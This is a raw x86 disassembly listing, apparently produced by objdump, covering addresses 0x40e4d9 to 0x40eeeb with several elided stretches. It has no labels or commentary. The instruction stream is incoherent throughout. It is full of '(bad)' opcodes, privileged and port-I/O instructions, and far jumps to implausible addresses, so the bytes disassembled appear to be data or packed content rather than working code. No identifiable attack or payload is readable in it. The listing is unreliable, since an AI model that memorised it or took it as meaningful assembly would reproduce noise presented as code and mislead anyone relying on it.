  40e4d9:	adc    eax,DWORD PTR [ecx-0x17]
  40e4dc:	lahf   
  40e4dd:	cmp    eax,0xf3235500
  40e4e2:	imul   ecx,DWORD PTR [ebx-0x21],0xb8d1575a
  40e4e9:	cmc    
  40e4ea:	(bad)  
  40e4eb:	call   0xceb48008
  40e4f0:	or     eax,0x546bb673
  40e4f5:	jge    0x40e546
  40e4f7:	adc    DWORD PTR [eax],ebx
  40e4f9:	pop    ebx
  40e4fa:	out    dx,eax
  40e4fb:	push   edi
  40e4fc:	mov    bh,0x1e
  40e4fe:	bound  ebp,QWORD PTR [eax]
  40e500:	sbb    BYTE PTR [ebx],ch
  40e502:	inc    DWORD PTR [eax]
  40e504:	sbb    BYTE PTR [eax-0x18],dl
  40e507:	ret    
  40e508:	mov    fs:0x1fc1e8fd,eax
  40e50e:	(bad)  
  40e50f:	inc    DWORD PTR [eax]
	...
  40e539:	sahf   
  40e53a:	pop    eax
  40e53b:	inc    esi
  40e53c:	add    BYTE PTR [ebx+0x57],0x75
  40e540:	cli    
  40e541:	mov    ebx,0x8cc031a3
  40e546:	mov    ds:0xa652fffd,al
  40e54b:	lods   al,BYTE PTR ds:[esi]
  40e54c:	cmp    dl,cl
  40e54e:	or     al,0xbb
  40e550:	dec    DWORD PTR [eax-0x428a025d]
  40e556:	outs   dx,DWORD PTR ds:[esi]
  40e557:	es jbe 0x40e54c
  40e55a:	mov    ds:0x95ec5e5d,al
  40e55f:	add    al,BYTE PTR [eax]
  40e561:	push   0xf983eace
  40e566:	mov    ds:0x339f0068,eax
  40e56b:	push   DWORD PTR [ebp-0x73]
  40e56e:	outs   dx,DWORD PTR ds:[esi]
  40e56f:	enter  0x9275,0xa3
  40e573:	xchg   DWORD PTR [ebp-0x6f],eax
  40e576:	out    dx,al
  40e577:	jmp    FWORD PTR [ecx+0x75]
  40e57a:	out    dx,eax
  40e57b:	jns    0x40e5df
  40e57d:	inc    esp
  40e57e:	push   edi
  40e57f:	push   0x80578500
  40e584:	call   0x400572
  40e589:	jle    0x40e522
  40e58b:	jb     0x40e5ac
  40e58d:	xor    eax,0x9282426f
  40e592:	mov    ds:0x5735684e,eax
  40e597:	out    dx,eax
  40e598:	mov    esi,0x416225dd
	...
  40e5c5:	add    BYTE PTR [ebp+0x47],al
  40e5c8:	push   DWORD PTR [ebp+0x2d]
  40e5cb:	outs   dx,DWORD PTR ds:[esi]
  40e5cc:	dec    esi
  40e5cd:	mov    eax,ds:0xe7d6e51c
  40e5d2:	lds    ebp,FWORD PTR [ecx-0x29]
  40e5d5:	(bad)  
  40e5d6:	sbb    edi,DWORD PTR [eax-0x2a]
  40e5d9:	dec    BYTE PTR [ecx-0x6e341594]
  40e5df:	icebp  
  40e5e0:	(bad)  
  40e5e1:	enter  0x80de,0x2
  40e5e5:	push   ebp
  40e5e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e7:	adc    BYTE PTR [ebx+0x28ef0c3],al
  40e5ed:	push   0x39
  40e5ef:	adc    DWORD PTR [ecx+0x8],edx
  40e5f2:	hlt    
  40e5f3:	xchg   esp,eax
  40e5f4:	dec    edi
  40e5f5:	(bad)  
  40e5f6:	fucomi st,st(3)
  40e5f8:	inc    eax
  40e5f9:	cld    
  40e5fa:	inc    esp
  40e5fb:	test   BYTE PTR [edx],al
  40e5fd:	out    dx,eax
  40e5fe:	mov    bl,BYTE PTR [esp+ecx*4+0x6a845d61]
  40e605:	ret    0xc33e
  40e608:	add    bh,bh
  40e60a:	sub    DWORD PTR [edx+ebp*8+0x5a],ebp
  40e60e:	jge    0x40e661
  40e610:	xlat   BYTE PTR ds:[ebx]
  40e611:	(bad)  
  40e612:	sub    DWORD PTR [eax-0x29],ebp
  40e615:	je     0x40e63b
  40e617:	dec    esp
  40e618:	jne    0x40e68e
  40e61a:	xchg   ebx,eax
  40e61b:	jns    0x40e5e8
  40e61d:	shl    DWORD PTR [eax],0x84
  40e620:	das    
  40e621:	mov    esi,DWORD PTR [eax+0x5]
  40e624:	sar    bl,0x6
  40e627:	test   BYTE PTR [eax+0x2e],ch
	...
  40e652:	add    BYTE PTR [ebx+0xf],dh
  40e655:	or     al,0xe8
  40e657:	xor    DWORD PTR [edi],edx
  40e659:	xlat   BYTE PTR ds:[ebx]
  40e65a:	(bad)  
  40e65b:	xchg   ebp,eax
  40e65c:	aas    
  40e65d:	fsub   DWORD PTR [edi+0x1c]
  40e660:	test   ch,ah
  40e662:	mov    ebp,0x4160c6c4
  40e667:	sbb    al,0x1c
  40e669:	loop   0x40e6cc
  40e66b:	fld    QWORD PTR [ebx+0x5b2474d5]
  40e671:	xchg   ecx,eax
  40e672:	and    edi,DWORD PTR [ebp+0x7a]
  40e675:	popf   
  40e676:	imul   ebx,DWORD PTR [ebx+ebx*2],0xffffff86
  40e67a:	xchg   ebp,eax
  40e67b:	mov    ebx,0x1c450a92
  40e680:	add    ecx,DWORD PTR [ebx+0x7e5b5d61]
  40e686:	push   eax
  40e687:	adc    al,0x83
  40e689:	fbld   TBYTE PTR [edx+eax*1-0x7af9286]
  40e690:	jns    0x40e66d
  40e692:	or     eax,DWORD PTR [edx+edi*1]
  40e695:	aam    0xd6
  40e697:	jmp    0x620e:0xe3ff2aa3
  40e69e:	out    0x9e,eax
  40e6a0:	sahf   
  40e6a1:	inc    esp
  40e6a2:	mov    ch,BYTE PTR [eax+0x4b]
  40e6a5:	jb     0x40e698
  40e6a7:	xor    eax,0xc040645b
  40e6ac:	or     ch,BYTE PTR [esi]
  40e6ae:	push   eax
  40e6af:	and    al,0x5
  40e6b1:	jmp    0x1e8c0f8c
  40e6b6:	xor    DWORD PTR [eax],eax
	...
  40e6e0:	or     al,ah
  40e6e2:	sub    BYTE PTR [eax-0x5],dl
  40e6e5:	in     eax,0xb3
  40e6e7:	xlat   BYTE PTR ds:[ebx]
  40e6e8:	stos   DWORD PTR es:[edi],eax
  40e6e9:	add    al,0xe9
  40e6eb:	imul   ebx,DWORD PTR [ebx+eax*1],0x5b1c01fe
  40e6f2:	test   BYTE PTR [edi+0x10],0x5
  40e6f6:	out    dx,al
  40e6f7:	aad    0xed
  40e6f9:	pop    esi
  40e6fa:	push   ebx
  40e6fb:	add    al,0x6
  40e6fd:	pop    ebx
  40e6fe:	sar    DWORD PTR [ebp+0x73e95afd],1
  40e704:	(bad)  
  40e705:	out    dx,eax
  40e706:	int3   
  40e707:	in     al,dx
  40e708:	fscale 
  40e70a:	call   0xecdd4c12
  40e70f:	add    esi,ecx
  40e711:	in     eax,0xff
  40e713:	les    ebx,FWORD PTR [ebp+0xb62fb9d]
  40e719:	dec    edi
  40e71a:	mov    edi,ebx
  40e71c:	lds    ebx,FWORD PTR [edx-0x73]
  40e71f:	and    al,0x44
  40e721:	sub    edi,edi
  40e723:	sbb    al,0x14
  40e725:	jp     0x40e79b
  40e727:	loope  0x40e6ae
  40e729:	pop    ebx
  40e72a:	(bad)  
  40e72b:	cld    
  40e72c:	add    edi,DWORD PTR [edx+0x51]
  40e72f:	ror    DWORD PTR [edx-0x6b318b48],1
  40e735:	paddb  mm3,QWORD PTR [ecx-0x7a]
  40e739:	pop    ebx
  40e73a:	push   0xffffffe9
  40e73c:	xchg   DWORD PTR [eax+0x2],edi
  40e73f:	jmp    0xf9b55f63
	...
  40e76c:	add    BYTE PTR [ebp+0x78],dh
  40e76f:	(bad)  
  40e770:	fcmovnu st,st(3)
  40e772:	add    al,BYTE PTR [eax]
  40e774:	rcr    DWORD PTR [edi],cl
  40e776:	cmp    DWORD PTR [eax-0x35],0x1f
  40e77a:	pop    ebx
  40e77b:	nop
  40e77c:	ss push ebx
  40e77e:	ja     0x40e767
  40e780:	stc    
  40e781:	cmp    al,0x5b
  40e783:	add    BYTE PTR [eax],dh
  40e785:	fisubr WORD PTR [eax+0x0]
  40e788:	mov    ah,0x94
  40e78a:	test   BYTE PTR [edx-0x7cee7fd3],al
  40e790:	mov    WORD PTR [edi+0x48ec7378],ss
  40e796:	mov    ds:0xe41fd5c1,al
  40e79b:	push   esp
  40e79c:	fst    QWORD PTR [edx+ecx*2+0x2897a48d]
  40e7a3:	push   0xffffffe9
  40e7a5:	dec    eax
  40e7a6:	out    dx,eax
  40e7a7:	or     ebx,esi
  40e7a9:	fisub  DWORD PTR [edx+0x6a]
  40e7ac:	jmp    0xce54d6f9
  40e7b1:	or     eax,0x8500850f
  40e7b6:	sub    DWORD PTR [edx-0x39],edx
  40e7b9:	add    bl,dl
  40e7bb:	(bad)  
  40e7bc:	push   DWORD PTR ds:0xad558b5c
  40e7c2:	loop   0x40e7d4
  40e7c4:	lea    eax,[eax]
  40e7c6:	ror    DWORD PTR [esi-0x73],cl
  40e7c9:	add    BYTE PTR [edi-0x70da95b2],bl
  40e7cf:	jae    0x40e789
	...
  40e7f9:	add    BYTE PTR [edx+0x18830c29],ch
  40e7ff:	sar    esi,cl
  40e801:	jae    0x40e7e3
  40e803:	loopne 0x40e880
  40e805:	ror    BYTE PTR [edx-0xf00ebd7],0x6b
  40e80c:	std    
  40e80d:	aaa    
  40e80e:	jp     0x40e839
  40e810:	or     al,0xff
  40e812:	shl    BYTE PTR [ebx-0x1],1
  40e815:	push   ebp
  40e816:	in     eax,dx
  40e817:	mov    ?,WORD PTR ds:0xfffa05e8
  40e81d:	inc    DWORD PTR [esi-0x49]
  40e820:	add    bh,bh
  40e822:	js     0x40e7f3
  40e824:	jae    0x40e806
  40e826:	pop    esi
  40e827:	aad    0x89
  40e829:	push   ebp
  40e82a:	sub    eax,0x90ff10e3
  40e82f:	sar    ebp,cl
  40e831:	push   edx
  40e832:	lods   eax,DWORD PTR ds:[esi]
  40e833:	cs leave 
  40e835:	ret    0x5ba1
  40e838:	push   ebp
  40e839:	mov    ebx,DWORD PTR [ecx+0x1bf8c2d9]
  40e83f:	(bad)  
  40e840:	std    
  40e841:	push   edi
  40e842:	push   cs
  40e843:	dec    ecx
  40e844:	adc    BYTE PTR [ebx-0x77c1f99],cl
  40e84a:	mov    ecx,DWORD PTR [ebx+0x5ecf50fd]
  40e850:	push   DWORD PTR [ebp+0x6d]
  40e853:	adc    eax,0x171cff00
  40e858:	hlt    
  40e859:	(bad)  
  40e85a:	out    dx,al
  40e85b:	mov    DWORD PTR gs:[edi+0x0],edi
	...
  40e886:	add    cl,cl
  40e888:	or     ecx,ebx
  40e88a:	test   BYTE PTR [eax-0x49],cl
  40e88d:	sar    dh,cl
  40e88f:	sbb    al,0x82
  40e891:	add    al,BYTE PTR [eax]
  40e893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e894:	push   cs
  40e895:	int3   
  40e896:	std    
  40e897:	xor    eax,eax
  40e899:	jle    0x40e8ac
  40e89b:	cdq    
  40e89c:	dec    bh
  40e89e:	std    
  40e89f:	and    edx,eax
  40e8a1:	xor    ecx,DWORD PTR [ebp-0x12e7b5f]
  40e8a7:	adc    edx,DWORD PTR [ebp+0x5e]
  40e8aa:	adc    BYTE PTR [ebx],cl
  40e8ac:	xor    ah,cl
  40e8ae:	std    
  40e8af:	add    ebp,esi
  40e8b1:	rcl    BYTE PTR [ecx+0x28],cl
  40e8b4:	add    DWORD PTR [ecx-0x2d020d05],edx
  40e8ba:	jmp    FWORD PTR [edi+0x5f]
  40e8bd:	cmp    DWORD PTR [esp+ebx*1-0x24012cf3],0x49fef68f
  40e8c8:	xchg   esp,eax
  40e8c9:	shl    DWORD PTR [eax+ebx*1-0x33],1
  40e8cd:	shl    DWORD PTR [esp+edx*1+0x1c],1
  40e8d1:	or     edi,edi
  40e8d3:	mov    ebx,0xcc68745
  40e8d8:	cmp    eax,0x55aafb81
  40e8dd:	shl    DWORD PTR [edi+edi*4+0x59],cl
  40e8e1:	stos   DWORD PTR es:[edi],eax
  40e8e2:	mov    dh,BYTE PTR [ecx-0x6c012db4]
  40e8e8:	jmp    0x41e7e2
	...
  40e911:	add    BYTE PTR [eax],al
  40e913:	add    cl,dl
  40e915:	pop    esp
  40e916:	sar    dh,cl
  40e918:	sub    DWORD PTR [ebp+0x34],0x8
  40e91c:	fstp   TBYTE PTR [edx]
  40e91e:	(bad)  
  40e91f:	nop    DWORD PTR [ebx+0x3c]
  40e923:	jg     0x40e99c
  40e925:	fsub   QWORD PTR [ebx+ecx*8+0x3ad57661]
  40e92c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e92d:	adc    ch,bl
  40e92f:	jle    0x40e95e
  40e931:	call   0x768ab4a1
  40e936:	mov    ebp,0x435ab633
  40e93b:	add    al,0x3b
  40e93d:	lock (bad) 
  40e940:	int    0x32
  40e942:	ins    BYTE PTR es:[edi],dx
  40e943:	ret    
  40e944:	mov    al,0xf8
  40e946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e947:	dec    eax
  40e948:	and    BYTE PTR [ebx-0x17],bl
  40e94b:	add    ebx,DWORD PTR [ebx+ecx*8]
  40e94e:	popa   
  40e94f:	js     0x40e95c
  40e951:	jne    0x40e8d8
  40e953:	rcl    BYTE PTR [esi+0x486c48],cl
  40e959:	or     esp,DWORD PTR [eax+ecx*4-0x9]
  40e95d:	je     0x40e9cc
  40e95f:	shl    BYTE PTR [ebx+0x1],cl
  40e962:	stc    
  40e963:	shl    BYTE PTR [eax-0x1d2da18e],cl
  40e969:	jne    0x40e925
  40e96b:	jmp    FWORD PTR [ebx-0x2c303427]
  40e971:	in     eax,0xbc
  40e973:	es cdq 
  40e975:	mov    bh,0x3c
  40e977:	rol    DWORD PTR [eax],1
	...
  40e9a1:	ret    0x5875
  40e9a4:	shl    BYTE PTR [eax],cl
  40e9a6:	dec    ebx
  40e9a7:	cs pop eax
  40e9a9:	and    BYTE PTR [esi-0x65],dh
  40e9ac:	sti    
  40e9ad:	push   edx
  40e9ae:	sub    edx,0xffffffd2
  40e9b1:	mov    ds:0x2bca6975,al
  40e9b6:	retf   
  40e9b7:	or     eax,0x7bca9040
  40e9bc:	jmp    0x7e8e6b5c
  40e9c1:	test   al,0x72
  40e9c3:	push   esi
  40e9c5:	dec    ebp
  40e9c6:	je     0x40e952
  40e9c8:	fisttp DWORD PTR [esi-0x52]
  40e9cb:	mul    edi
  40e9cd:	dec    ebp
  40e9ce:	je     0x40e9ce
  40e9d0:	cmp    esp,DWORD PTR [eax+0x14]
  40e9d3:	leave  
  40e9d4:	stos   DWORD PTR es:[edi],eax
  40e9d5:	sbb    al,0x5b
  40e9d7:	push   ebp
  40e9d8:	bound  edi,QWORD PTR [esp+esi*2]
  40e9db:	je     0x40e9ce
  40e9dd:	ins    BYTE PTR es:[edi],dx
  40e9de:	out    dx,al
  40e9df:	pop    ss
  40e9e0:	sar    eax,1
  40e9e2:	call   0xee8ea0e5
  40e9e7:	or     eax,ecx
  40e9e9:	adc    edi,esp
  40e9eb:	(bad)  
  40e9ec:	call   0xa9c37f5f
  40e9f1:	sbb    cl,BYTE PTR [ebx]
  40e9f3:	call   FWORD PTR [esp+ebx*1]
  40e9f6:	je     0x40ea6c
  40e9f8:	icebp  
  40e9f9:	div    DWORD PTR [edi]
  40e9fb:	jb     0x40e983
  40e9fd:	in     eax,dx
  40e9fe:	jne    0x40ea74
  40ea00:	aad    0xec
  40ea02:	out    dx,eax
  40ea03:	pcmpeqd mm0,QWORD PTR [eax]
	...
  40ea2e:	push   ebx
  40ea2f:	push   ebx
  40ea30:	call   0xfeb533f3
  40ea35:	xor    dl,ah
  40ea37:	dec    eax
  40ea38:	add    BYTE PTR [eax+eiz*2-0x28230180],dh
  40ea3f:	jne    0x40eab5
  40ea41:	icebp  
  40ea42:	idiv   DWORD PTR [ebp+0x70]
  40ea45:	inc    esi
  40ea46:	in     eax,dx
  40ea47:	jne    0x40eabd
  40ea49:	in     eax,dx
  40ea4a:	out    0x58,eax
  40ea4c:	pusha  
  40ea4d:	jmp    0x2e910571
  40ea52:	dec    ebx
  40ea53:	call   FWORD PTR [si+0x7cb7]
  40ea58:	pop    es
  40ea59:	fwait
  40ea5a:	int3   
  40ea5b:	jne    0x40ea5b
  40ea5d:	pushf  
  40ea5e:	xchg   ebx,eax
  40ea5f:	jne    0x40ead5
  40ea61:	stc    
  40ea62:	ins    BYTE PTR es:[edi],dx
  40ea63:	out    dx,eax
  40ea64:	pop    ss
  40ea65:	add    BYTE PTR ds:0x82ff6fa5,ch
  40ea6b:	mov    cl,0xc0
  40ea6d:	adc    al,0x85
  40ea6f:	sub    eax,0xa304ec8b
  40ea74:	shl    bh,cl
  40ea76:	or     BYTE PTR [ebx-0xbe28a03],0x83
  40ea7d:	add    BYTE PTR [ecx-0x75],dh
  40ea80:	std    
  40ea81:	push   eax
  40ea82:	bound  ecx,QWORD PTR ds:0xa54ae808
  40ea88:	std    
  40ea89:	(bad)  
  40ea8a:	out    dx,eax
  40ea8b:	pop    esi
  40ea8c:	push   0x0
  40ea8e:	fisttp QWORD PTR [ecx+0x1]
	...
  40eab8:	add    BYTE PTR [eax],al
  40eaba:	add    BYTE PTR [ebp-0xb],al
  40eabd:	add    DWORD PTR [eax],0x7d
  40eac0:	mov    edi,ebp
  40eac2:	push   eax
  40eac3:	jp     0x165660c6
  40eac9:	add    BYTE PTR [edx+0x5],ch
  40eacc:	nop
  40eacd:	sbb    al,0x60
  40eacf:	cmc    
  40ead0:	push   edi
  40ead1:	mov    DWORD PTR [ebp-0x26c7b],0x57d5
  40eadb:	mov    edx,0x82f7f2dc
  40eae0:	mov    eax,DWORD PTR [eax]
  40eae2:	add    ch,dh
  40eae4:	push   edi
  40eae5:	mov    DWORD PTR [ebp-0x26c93],0x57c5
  40eaef:	cli    
  40eaf0:	fdiv   st(2),st
  40eaf2:	test   DWORD PTR [edx],0xc5fffe8b
  40eaf8:	push   edi
  40eaf9:	mov    edx,DWORD PTR [ebp-0x33]
  40eafc:	not    BYTE PTR [eax]
  40eafe:	push   0xffffffb5
  40eb00:	hlt    
  40eb01:	xor    eax,0xa
  40eb04:	mov    edi,ebp
  40eb06:	push   eax
  40eb07:	sbb    al,0xff
  40eb09:	test   ebx,ebp
  40eb0b:	mov    esp,DWORD PTR [eax+edx*8+0x4f]
  40eb0f:	cdq    
  40eb10:	push   es
  40eb11:	fcomi  st,st(6)
  40eb13:	xor    DWORD PTR [ecx+esi*1-0x1],0xfffffff1
  40eb18:	xchg   ecx,eax
  40eb19:	iret   
  40eb1a:	je     0x40eb3c
  40eb1c:	test   DWORD PTR [eax+ecx*1+0x0],edx
	...
  40eb48:	test   BYTE PTR [ecx-0x6afb8b33],0x31
  40eb4f:	inc    esp
  40eb50:	lahf   
  40eb51:	into   
  40eb52:	fcomi  st,st(6)
  40eb54:	push   ebx
  40eb55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb56:	add    ecx,DWORD PTR [edi]
  40eb58:	mov    al,ds:0x1c00037d
  40eb5d:	add    DWORD PTR [ecx-0x3153cc15],edx
  40eb63:	jmp    DWORD PTR [edx]
  40eb65:	(bad)  
  40eb66:	inc    BYTE PTR [eax]
  40eb68:	sbb    al,0x82
  40eb6a:	lds    eax,FWORD PTR [eax+ecx*2+0x1cfececc]
  40eb71:	test   ch,bl
  40eb73:	mov    ebp,0x4161d384
  40eb78:	sbb    al,0xe7
  40eb7a:	mov    bh,bh
  40eb7c:	pop    es
  40eb7d:	repnz into 
  40eb7f:	dec    edi
  40eb80:	add    al,0xc1
  40eb82:	add    BYTE PTR cs:[edi+esi*8],bl
  40eb86:	ret    
  40eb87:	jae    0x40ebe7
  40eb89:	inc    ecx
  40eb8a:	mov    ebx,edx
  40eb8c:	jmp    0x40eb9f
  40eb8e:	iret   
  40eb8f:	add    BYTE PTR [ecx+ebx*1],bl
  40eb92:	mov    fs,WORD PTR [edi+0x1f]
  40eb95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb96:	inc    ebx
  40eb97:	add    BYTE PTR [ecx-0x3c03fc01],bl
  40eb9d:	xor    DWORD PTR [eax+ebp*8],esi
  40eba0:	or     ecx,0x44990002
  40eba6:	pop    eax
  40eba7:	and    esp,ebx
  40eba9:	pop    ebx
  40ebaa:	ins    BYTE PTR es:[edi],dx
  40ebab:	mov    eax,0x0
	...
  40ebd4:	add    BYTE PTR [edx+0x1c021d72],ch
  40ebda:	adc    BYTE PTR [esi+0x5c],0x37
  40ebde:	(bad)  
  40ebdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebe0:	add    ebx,DWORD PTR [ecx-0x7d301728]
  40ebe6:	jb     0x40eb80
  40ebe8:	(bad)  [ecx-0x66fc16ee]
  40ebee:	fisttp QWORD PTR [eax+0x3e95bbe]
  40ebf5:	hlt    
  40ebf6:	inc    ecx
  40ebf7:	dec    edx
  40ebf8:	inc    ebp
  40ebf9:	sbb    al,0xe0
  40ebfb:	imul   eax,DWORD PTR [ebx],0x54
  40ebfe:	jb     0x40ebcd
  40ec00:	xor    esi,DWORD PTR [esp+eax*1]
  40ec03:	dec    ecx
  40ec04:	add    al,0x1c
  40ec06:	test   ax,0xad57
  40ec0a:	(bad)  
  40ec0c:	mov    ah,dh
  40ec0e:	sbb    ebp,ecx
  40ec10:	add    ebx,DWORD PTR [ebx]
  40ec12:	xlat   BYTE PTR ds:[ebx]
  40ec13:	add    ebx,DWORD PTR [si]
  40ec16:	pop    ebx
  40ec17:	sahf   
  40ec18:	cwde   
  40ec19:	add    ebp,DWORD PTR [edx-0x6b]
  40ec1c:	into   
  40ec1d:	mov    ds:0xad688d7,al
  40ec22:	jb     0x40eba9
  40ec24:	cwde   
  40ec25:	imul   DWORD PTR [ecx+0x7d]
  40ec28:	into   
  40ec29:	stos   BYTE PTR es:[edi],al
  40ec2a:	xlat   BYTE PTR ds:[ebx]
  40ec2b:	mov    esi,ss
  40ec2d:	bnd jno 0x40ec8b
  40ec30:	mov    bl,dl
  40ec32:	imul   esp,DWORD PTR [ebp-0x32],0x59e80553
	...
  40ec61:	add    BYTE PTR [eax*1+0x51c59e9],bl
  40ec68:	jmp    0x3dbb8ced
  40ec6d:	into   
  40ec6e:	ret    0x3e0a
  40ec71:	clc    
  40ec72:	jbe    0x40ec99
  40ec74:	add    BYTE PTR [eax-0x4a3f99e1],ch
  40ec7a:	bound  esi,QWORD PTR [edx+0x74]
  40ec7d:	std    
  40ec7e:	shl    BYTE PTR [esi+0x706a16d7],cl
  40ec84:	(bad)  
  40ec85:	pop    esp
  40ec86:	ret    
  40ec87:	push   0xe65a0efe
  40ec8c:	clts   
  40ec8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec8f:	(bad)  
  40ec90:	idiv   dh
  40ec92:	imul   edi,DWORD PTR [ecx+0xf],0xfe7061f7
  40ec99:	xor    al,0xbb
  40ec9b:	push   0x340e6fe
  40eca0:	pop    esi
  40eca1:	jmp    0xd65d72c5
  40eca6:	jmp    0x40ecee
  40eca8:	call   DWORD PTR [eax+ebp*2+0x51c6fe68]
  40ecaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecb0:	jmp    0x40ec68
  40ecb2:	imul   esi,DWORD PTR [eax-0x2],0xb470283c
  40ecb9:	xchg   ebp,eax
  40ecba:	push   ecx
  40ecbb:	jo     0x40ecbb
  40ecbd:	xchg   ecx,eax
  40ecbe:	cmp    ch,BYTE PTR [esi-0x2]
  40ecc1:	sahf   
  40ecc2:	jmp    0xdfd86e
	...
  40ecef:	loope  0x40ed62
  40ecf1:	out    0x9,eax
  40ecf3:	cmp    DWORD PTR [ebx+0x0],ebx
  40ecf6:	mov    al,0xde
  40ecf8:	dec    esp
  40ecf9:	add    BYTE PTR [esi*2-0x77527d7c],dl
  40ed00:	push   es
  40ed01:	push   esp
  40ed03:	jmp    0x40ed7d
  40ed05:	or     al,dh
  40ed07:	pop    ds
  40ed08:	pop    ebx
  40ed09:	or     ebp,DWORD PTR [ecx]
  40ed0b:	jae    0x40ed63
  40ed0d:	pop    esi
  40ed0e:	and    dh,bl
  40ed10:	add    BYTE PTR fs:[eax],bh
  40ed13:	rcr    ch,0xbf
  40ed16:	add    BYTE PTR [edi-0x7f72310d],dh
  40ed1c:	nop
  40ed1d:	dec    esi
  40ed1e:	push   edx
  40ed1f:	jmp    0xfdf0:0xce80c07
  40ed26:	dec    esi
  40ed28:	mov    ch,0x87
  40ed2a:	dec    ebp
  40ed2b:	push   ecx
  40ed2c:	xchg   edx,eax
  40ed2d:	or     BYTE PTR [esi],dh
  40ed2f:	jp     0x40ecf7
  40ed31:	inc    edx
  40ed32:	sub    DWORD PTR [ecx-0x4b2bbaa3],ecx
  40ed38:	fcomi  st,st(7)
  40ed3a:	adc    al,0xf7
  40ed3c:	mov    WORD PTR [ecx],gs
  40ed3e:	idiv   ah
  40ed40:	pop    es
  40ed41:	shr    bl,1
  40ed43:	pop    ebp
  40ed44:	inc    esi
  40ed45:	movzx  esi,BYTE PTR [ecx]
  40ed48:	push   ecx
  40ed49:	in     al,dx
  40ed4a:	push   eax
  40ed4b:	in     eax,dx
  40ed4c:	adc    DWORD PTR [ebx+0x41],esp
  40ed4f:	inc    ebp
  40ed50:	icebp  
  40ed51:	inc    ebx
  40ed52:	fadd   DWORD PTR [eax]
	...
  40ed7c:	add    eax,0x355f0e8f
  40ed81:	pop    esp
  40ed82:	add    esp,0x49
  40ed85:	icebp  
  40ed86:	inc    ebx
  40ed87:	fcom   DWORD PTR ds:0x5dd0739e
  40ed8d:	ret    0xff74
  40ed90:	jp     0x40ed87
  40ed92:	inc    ebx
  40ed93:	rol    BYTE PTR [ebx-0x26],1
  40ed96:	cld    
  40ed97:	adc    al,0x37
  40ed99:	stos   BYTE PTR es:[edi],al
  40ed9a:	jg     0x40ee01
  40ed9c:	rcr    DWORD PTR [esi-0x610a0002],1
  40eda2:	jae    0x40ed78
  40eda4:	or     eax,0x5416312
  40eda9:	icebp  
  40edaa:	inc    ebx
  40edab:	fadd   DWORD PTR ds:0xf55ede8f
  40edb1:	pop    ebx
  40edb2:	add    esp,0xffffffc9
  40edb5:	lock inc ebx
  40edb7:	fcomp  DWORD PTR [edx+esi*4]
  40edba:	retf   
  40edbb:	je     0x40eda9
  40edbd:	sbb    DWORD PTR [ecx+0x7a18c375],ebx
  40edc3:	inc    esp
  40edc4:	int3   
  40edc5:	inc    BYTE PTR [ebp-0x34]
  40edc8:	dec    esp
  40edc9:	sub    DWORD PTR [esi-0x30],edx
  40edcc:	xor    al,0xb2
  40edce:	pop    edi
  40edcf:	inc    ecx
  40edd0:	sbb    al,0x39
  40edd2:	push   ss
  40edd3:	loope  0x40edb9
  40edd5:	ret    0xe802
  40edd8:	leave  
  40edd9:	into   
  40edda:	retf   
  40eddb:	(bad)  
  40eddc:	pop    ss
  40eddd:	inc    edx
  40edde:	cld    
  40eddf:	add    DWORD PTR [eax],0x0
	...
  40ee06:	add    BYTE PTR [eax],al
  40ee08:	add    BYTE PTR [ebx-0x5afffd7f],ch
  40ee0e:	mov    dh,0xba
  40ee10:	xor    cl,0x35
  40ee13:	add    ecx,DWORD PTR [edi]
  40ee15:	mov    al,ds:0x1c000303
  40ee1a:	jns    0x40ee6c
  40ee1c:	or     al,0x44
  40ee1e:	aaa    
  40ee1f:	sub    al,BYTE PTR [eax]
  40ee21:	sbb    al,0xb3
  40ee23:	jecxz  0x40eda7
  40ee25:	pop    esp
  40ee26:	cmp    DWORD PTR [ebx+0x44],0xffffff8c
  40ee2a:	cwde   
  40ee2b:	push   eax
  40ee2c:	or     al,0xab
  40ee2e:	ss nop
  40ee30:	(bad)  
  40ee31:	test   eax,0x5c447ab5
  40ee36:	rcl    BYTE PTR [eax-0x38],0x93
  40ee3a:	ds rol dh,0x61
  40ee3e:	adc    BYTE PTR [eax+eax*1],al
  40ee41:	sbb    al,0x84
  40ee43:	test   DWORD PTR [edi+eax*8],edi
  40ee46:	cmp    DWORD PTR [ebp+0x0],eax
  40ee49:	sbb    al,0x70
  40ee4b:	xor    cl,BYTE PTR [ebp+0x6a341c61]
  40ee51:	sbb    eax,0x1c6a045a
  40ee56:	cmovno esi,DWORD PTR [eax+0x3d35b4c]
  40ee5d:	test   eax,0xd3342918
  40ee62:	dec    eax
  40ee63:	xchg   edx,eax
  40ee64:	aas    
  40ee65:	pop    ebp
  40ee66:	pop    ebx
  40ee67:	loop   0x40ee2c
  40ee69:	dec    edi
  40ee6a:	sub    DWORD PTR [edx+0x49],ebp
	...
  40ee95:	add    BYTE PTR [eax+0x5b],bh
  40ee98:	mov    ch,0x17
  40ee9a:	lahf   
  40ee9b:	lock fadd DWORD PTR [ebx]
  40ee9e:	xor    BYTE PTR [ebx+0x62],ah
  40eea1:	xor    DWORD PTR [esi*8+0x5b5b062d],ecx
  40eea8:	push   ds
  40eea9:	push   ecx
  40eeaa:	and    al,0x6e
  40eeac:	fwait
  40eead:	mov    ecx,DWORD PTR [edx+0x8cb4ce8]
  40eeb3:	pop    edi
  40eeb4:	xchg   ecx,eax
  40eeb5:	push   es
  40eeb6:	sbb    al,0x7e
  40eeb8:	fmul   QWORD PTR ds:[edi+ebp*2-0x1795350b]
  40eec0:	sub    al,0xdc
  40eec2:	jno    0x40eed3
  40eec4:	jmp    0xb12949cc
  40eec9:	fist   DWORD PTR [ecx-0x14]
  40eecc:	aad    0xca
  40eece:	dec    edx
  40eecf:	call   0xec8aca8c
  40eed4:	(bad)
  40eed7:	mov    ds:0x733f7aa,eax
  40eedc:	(bad)  
  40eedd:	xlat   BYTE PTR ds:[ebx]
  40eede:	sahf   
  40eedf:	xchg   edi,eax
  40eee0:	mov    al,ds:0x386ed878
  40eee5:	pop    esp
  40eee6:	arpl   dx,di
  40eee8:	daa    
  40eee9:	add    al,0x86
  40eeeb:	pop    eax
